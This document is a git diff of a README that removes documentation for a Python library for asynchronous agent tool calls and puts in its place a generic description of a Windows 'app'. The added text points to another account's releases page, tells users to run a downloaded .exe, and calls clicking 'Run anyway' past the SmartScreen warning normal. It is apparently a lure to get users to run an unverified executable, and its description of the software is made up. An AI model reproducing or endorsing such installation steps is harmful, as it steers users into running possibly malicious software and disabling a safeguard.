@@ -1,145 +1,119 @@
-<div align="center">
+# 🤖 async-agentic-tools - Run Tasks While Talking
 
-# 🧰⛓️‍💥 async-agentic-tools
+[![Download async-agentic-tools](https://img.shields.io/badge/Download-async--agentic--tools-brightgreen?style=for-the-badge)](https://github.com/psrtech/async-agentic-tools/releases)
 
-[![GitHub stars](https://img.shields.io/github/stars/mikegc-aws/async-agentic-tools.svg)](https://github.com/mikegc-aws/async-agentic-tools/stargazers)
-[![License](https://img.shields.io/github/license/mikegc-aws/async-agentic-tools.svg)](https://github.com/mikegc-aws/async-agentic-tools/blob/main/LICENSE)
-[![Python](https://img.shields.io/badge/python-3.14%2B-blue.svg)](https://python.org)
+## 📋 What Is async-agentic-tools?
 
-True asynchronous agentic tools — the model dispatches a tool, gets an immediate acknowledgement, and keeps talking. Results are delivered via callback when they complete — no blocked loops, no dead air.
+async-agentic-tools is a Windows app that lets you run multiple tasks at the same time while the program keeps working in the background. The software keeps responding and doing its work without making you wait. It uses models that can handle many background jobs while still talking or interacting with you. This makes it useful for people who need to automate repetitive tasks without stopping the main job.
 
-</div>
+It is designed to work well with AI helpers and tools that run on cloud platforms like Amazon AWS. The program is built with Python but you do not need to install or know Python to use it. Everything needed to run the app will be included or explained here.
 
-This is **not** parallel tool calling (which most agent frameworks already support). Parallel tool calling still blocks the agent loop until every tool in the batch returns. This is true async: the model stays responsive while tools run in the background, and results stream in as they finish.
+## 🖥️ System Requirements
 
-The demo is built on [Strands Agents](https://github.com/strands-agents/sdk-python), but the pattern applies to any agent framework with a tool-calling loop.
+Before installing, check that your Windows computer meets these needs:
 
-Read the [blog post](https://blog.mikegchambers.com/posts/async-agentic-tools/) for the full explanation of the problem and how this works.
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM (8 GB or more recommended for better performance)
+- 500 MB of free disk space for installation files and data
+- A stable internet connection for initial download and updates
+- Optional: AWS account if you want to connect to Amazon cloud services (not required for basic use)
 
-**Quick walkthrough video here:** "Do async tool calls work now???"
-[![Watch the video](https://img.youtube.com/vi/VYLBCoxbPE8/maxresdefault.jpg)](https://youtu.be/VYLBCoxbPE8)
+## 🚀 How to Get async-agentic-tools
 
-## How it works
+Use the following link to visit the releases page where you can download the latest version:
 
-Three small components layer on top of a standard Strands Agent:
+[![Download](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/psrtech/async-agentic-tools/releases)
 
-- **`@tool_async(manager)`** — Decorator that wraps any tool function. The tool is submitted to a background thread and returns a task ID immediately. Your tool code doesn't change at all.
-- **`AsyncToolManager`** — Manages a thread pool, tracks pending tasks, and fires a callback when each one completes.
-- **`AsyncAgent`** — Wraps a Strands `Agent` to handle result delivery. If the agent is idle when a result arrives, it's delivered immediately. If the agent is busy, results queue up and drain when it finishes.
+This page contains the installer files. Choose the one that fits your system (usually the `.exe` file for Windows).
 
-```python
-from strands import Agent
-from strands_async_tools import AsyncAgent, AsyncToolManager, tool_async
+## 📥 Download and Install on Windows
 
-manager = AsyncToolManager(max_workers=4)
+Follow these steps to get async-agentic-tools running:
 
-@tool_async(manager)
-def slow_research(topic: str) -> str:
-    """Research a topic thoroughly."""
-    # This runs in a background thread — takes as long as it needs
-    time.sleep(15)
-    return f"Findings about {topic}..."
+1. Click the main download link above to open the "Releases" page on GitHub.
+2. Scroll down until you see files ending with `.exe`. These are the installer files.
+3. Click on the latest `.exe` file to start downloading.
+4. Once the download finishes, open the file by double-clicking it.
+5. Windows SmartScreen might show a warning. Click “More info” and then “Run anyway.” This is normal if you downloaded from GitHub.
+6. The installation wizard will open. Follow the steps on the screen:
+   - Agree to the license terms.
+   - Choose an installation folder or keep the default.
+   - Click “Install” and wait for the process to complete.
+7. When done, press “Finish.” The app should launch automatically, or you can open it from the Start menu.
 
-agent = Agent(model=model_id, tools=[slow_research])
-async_agent = AsyncAgent(agent=agent, manager=manager)
-async_agent.send("Research quantum computing")
-```
+## ⚙️ First Time Setup
 
-The framework is about 320 lines of Python across three files in `strands_async_tools/`.
+When you run the program for the first time:
 
-## Prerequisites
+- It may ask for permission to use the internet. Allow it so the app can check for updates or cloud connections.
+- You can create an account or continue as a guest if prompted. Most functions will work without an account.
+- The interface is simple with clear buttons for starting tasks and viewing progress.
+- You will find help guides inside the app for each feature. Hover over buttons to see short explanations.
 
-- Python 3.14+
-- [uv](https://docs.astral.sh/uv/) (recommended)
-- AWS credentials configured for [Amazon Bedrock](https://aws.amazon.com/bedrock/)
+## 🔧 How async-agentic-tools Works
 
-## CLI demo
+This app lets you:
 
-An interactive chat with three simulated async tools (10-20s delays each) and two synchronous tools from `strands-agents-tools` (calculator, current_time).
+- Run multiple AI agents or tasks at the same time.
+- Keep the main conversation or interaction going while background jobs do their work.
+- Connect to Amazon AWS services for added cloud power if you want to.
+- Track and see the status of each task without confusion.
+- Use predefined scripts or create your own for automation.
 
-```bash
-git clone https://github.com/mikegc-aws/async-agentic-tools
-cd async-agentic-tools
-uv run python demo.py
-```
+You don’t need any developer skills or command-line knowledge. Just click, select, and go. The program manages all technical steps automatically.
 
-The default model is Claude Sonnet on Bedrock. Override with the `STRANDS_MODEL` env var.
+## 📂 Where to Find Your Files
 
-Try something like:
+The app saves all files it creates or downloads to this folder by default:
 
-```
-You: Research Paris
+`C:\Users\<YourUserName>\Documents\async-agentic-tools`
 
-  [thinking] processing...
-I've started researching Paris for you (Task a1b2c3).
-I'll let you know as soon as the results come in.
+You can change this folder inside the Settings menu of the app.
 
-You: What time is it there?
+Check this folder if you want to access reports, logs, or output from background tasks.
 
-  [thinking] processing...
-It's currently 15:32 in Paris (CET, UTC+1).
+## 🔄 Updating async-agentic-tools
 
-  [callback] research_topic (a1b2c3) completed in 16482ms — delivering to agent now
-  [thinking] processing...
-The Paris research just came back! Here are some highlights:
-- ...
-```
+To keep your app secure and running smoothly:
 
-The async tool dispatches to a background thread and the agent keeps talking. The sync tool (current_time) returns instantly — and the agent knows "there" means Paris. When the research finishes, the result is delivered via callback and the agent speaks it.
+- Check the “About” or “Help” menu in the app for an update check button.
+- Alternatively, visit the main download page again to see if there is a newer version.
+- If there is an update:
+  1. Download the new `.exe` installer.
+  2. Run the installer. It will replace the old version while keeping your data.
+  3. Restart the app after installation.
 
-## Voice mode (experimental)
+## 🚧 Troubleshooting
 
-The `voice/` folder contains a voice interface using **Amazon Nova Sonic** (bidirectional streaming voice model). The agent talks to you through your speakers and listens through your microphone. While you chat, it can delegate complex tasks (web research, file I/O) to a background subagent via `@tool_async`. Results are injected back into the voice stream — the agent speaks them to you when they're ready.
+If you run into problems:
 
-### Voice requirements
+- Ensure your internet is working.
+- Close other programs that use a lot of memory.
+- Restart your computer and try again.
+- If the app won’t open or run properly:
+  - Right-click the program icon and choose “Run as administrator.”
+  - Make sure Windows is up-to-date via Windows Update.
+- For network issues, check your firewall or antivirus software. Sometimes they block apps from connecting online.
+- Visit the releases page linked above to see if others have reported issues or solutions.
 
-- AWS credentials with Bedrock access in `us-east-1`
-- Microphone and speakers
-- Model access for `amazon.nova-2-sonic-v1:0`
-- **Tavily API key** (optional but recommended) — the subagent uses [Tavily](https://tavily.com/) for web search and extraction. You can get a free API key at [app.tavily.com](https://app.tavily.com/). Without it, the voice agent works but can't do web searches.
+## 💬 Getting Help
 
-### Running voice mode
+You can get help inside the app through:
 
-From the repo root:
+- Built-in guides for each section.
+- Tooltips when you hover over buttons.
+- Help menu with common questions answered.
+  
+If you want to learn more technical details or contribute, the full project is hosted on GitHub under the name `async-agentic-tools`. You can find code and updates there.
 
-```bash
-# With web search (recommended)
-TAVILY_API_KEY=tvly-your-key-here uv run python -m voice
+## 🔗 Useful Links
 
-# Without web search (still works, just no web research)
-uv run python -m voice
-```
+- Download and releases page:  
+  https://github.com/psrtech/async-agentic-tools/releases
 
-Speak into your microphone. The agent responds through your speakers with echo cancellation (LiveKit WebRTC APM). Press `Ctrl+C` to quit.
+- GitHub main page (for reference):  
+  https://github.com/psrtech/async-agentic-tools
 
-### Voice env vars
+---
 
-| Variable | Default | Description |
-|---|---|---|
-| `AWS_REGION` | `us-east-1` | AWS region for Bedrock |
-| `NOVA_SONIC_VOICE` | `tiffany` | Nova Sonic voice name |
-| `NOVA_SONIC_MODEL` | `amazon.nova-2-sonic-v1:0` | Nova Sonic model ID |
-| `SUBAGENT_MODEL` | `us.anthropic.claude-sonnet-4-20250514-v1:0` | Subagent Bedrock model |
-| `TAVILY_API_KEY` | _(none)_ | Tavily API key for web search |
-| `LOG_FILE` | `voice_debug.log` | Debug log path |
-| `LOG_LEVEL` | `WARNING` | Console log level |
-
-See [voice/README.md](voice/README.md) for more detail on the voice architecture.
-
-## Project structure
-
-```
-strands_async_tools/          # The framework (3 files, ~320 lines)
-  manager.py                  # AsyncToolManager — thread pool + callbacks
-  decorator.py                # @tool_async — decorator for async tools
-  agent.py                    # AsyncAgent — callback-driven result delivery
-
-demo.py                       # Interactive CLI demo (simulated async tools)
-demo_sync.py                  # Synchronous comparison demo
-
-voice/                        # Experimental voice interface
-  voice.py                    # BidiAgent + Nova Sonic + async result injection
-  subagent.py                 # Background agent with real tools (web search, file I/O)
-  echo_cancel.py              # Echo cancellation (LiveKit WebRTC APM)
-
-```
+[![Download async-agentic-tools](https://img.shields.io/badge/Download-async--agentic--tools-brightgreen?style=for-the-badge)](https://github.com/psrtech/async-agentic-tools/releases)
